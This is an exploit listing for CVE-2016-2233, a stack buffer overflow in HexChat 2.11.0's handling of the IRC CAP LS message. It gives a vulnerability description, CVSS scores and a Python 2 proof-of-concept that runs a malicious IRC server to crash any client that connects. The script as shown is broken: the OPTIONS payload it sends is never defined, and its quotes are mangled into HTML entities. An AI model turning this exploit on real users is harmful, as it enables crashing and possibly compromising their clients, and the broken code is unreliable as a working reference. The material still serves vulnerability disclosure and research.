#
####################
# Meta information #
####################
# Exploit Title: Hexchat IRC client - CAP LS Handling Stack Buffer Overflow
# Date: 2016-02-07
# Exploit Author: PizzaHatHacker
# Vendor Homepage: https://hexchat.github.io/index.html
# Software Link: https://hexchat.github.io/downloads.html
# Version: 2.11.0
# Tested on: HexChat 2.11.0 & Linux (64 bits) + HexChat 2.10.2 & Windows 8.1 (64 bits)
# CVE : CVE-2016-2233
 
#############################
# Vulnerability description #
#############################
&#039;&#039;&#039;
Stack Buffer Overflow in src/common/inbound.c :
void inbound_cap_ls (server *serv, char *nick, char *extensions_str, const message_tags_data *tags_data)
 
In this function, Hexchat IRC client receives the available extensions from 
the IRC server (CAP LS message) and constructs the request string to indicate
later which one to use (CAP REQ message).
This request string is stored in the fixed size (256 bytes) byte array
&#039;buffer&#039;. It has enough space for all possible options combined, BUT
it will overflow if some options are repeated.
 
CVSS v2 Vector (AV:N/AC:L/Au:N/C:P/I:P/A:P)
CVSS Base Score : 7.5
Impact Subscore : 6.4
Exploitability Subscore : 10
&#039;&#039;&#039;
 
####################
# Proof of Concept #
####################
&#039;&#039;&#039;
* Install Hexchat IRC Client
* Run this Python script on a (server) machine
* Connect to the server running the script
* Results : Hexchat will crash (most probably access violation/segmentation fault)
&#039;&#039;&#039;
 
import socket
import sys
import time
 
# Exploit configuration
HOST = &#039;&#039;
PORT = 6667
SERVERNAME = &#039;irc.example.com&#039;
 
# Create server socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.bind((HOST, PORT)) # Bind to port
    sock.listen(0) # Start listening on socket
     
    print &#039;Server listening, waiting for connection...&#039;
    conn, addr = sock.accept()
     
    print &#039;Connected with &#039; + addr[0] + &#039;:&#039; + str(addr[1]) + &#039;, sending packets...&#039;
    conn.send(&#039;:&#039; + SERVERNAME + &#039; CAP * LS :&#039; + OPTIONS + &#039;\r\n&#039;)
     
    # Wait and close socket
    conn.recv(256)
    sock.close()
     
    print &#039;Done.&#039;
 
except socket.error as msg:
    print &#039;Network error : &#039; + str(msg[0]) + &#039; &#039; + msg[1]

